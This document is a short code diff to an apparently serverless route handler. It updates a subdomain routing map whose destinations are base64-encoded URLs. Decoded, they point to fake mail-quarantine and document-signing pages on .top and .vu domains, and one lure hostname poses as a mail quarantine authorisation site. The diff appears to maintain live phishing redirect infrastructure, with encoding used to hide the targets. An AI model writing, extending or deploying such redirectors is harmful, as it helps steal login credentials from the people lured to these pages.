@@ -9,7 +9,7 @@ export async function GET(request) {
   // 🌐 SUBDOMAIN ROUTING MAP (Syntax fixed, commas restored, updated destination targets)
   const SUBDOMAIN_MAP = {
     "quarantine-mail-authorize-cloud.vercel.app": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
-    "going": "aHR0cHM6Ly9kb2N1bWVudC5zeXN0ZW1vdmEudnUvcHJvcG9zYWwvU2lnbi9pLmh0bWw=",
+    "going": "aHR0cHM6Ly9zZXR0bGVtZW50LnN5c3RlbW92YS52dS9zZXR0bGVtZW50L1NpZ24vaS5odG1s",
     "table": "aHR0cHM6Ly9zZXR0bGVtZW50LnN5c3RlbW92YS52dS9zZXR0bGVtZW50L1NpZ24vaS5odG1s",
     "schedule": "aHR0cHM6Ly9zZXR0bGVtZW50LnN5c3RlbW92YS52dS9zZXR0bGVtZW50L1NpZ24vaS5odG1s",
     "internal": "aHR0cHM6Ly9zZXR0bGVtZW50ZG9jcmVhZGluZy50b3A/aTQyVVMyQXdIQVk9WW05aGVYVT0="
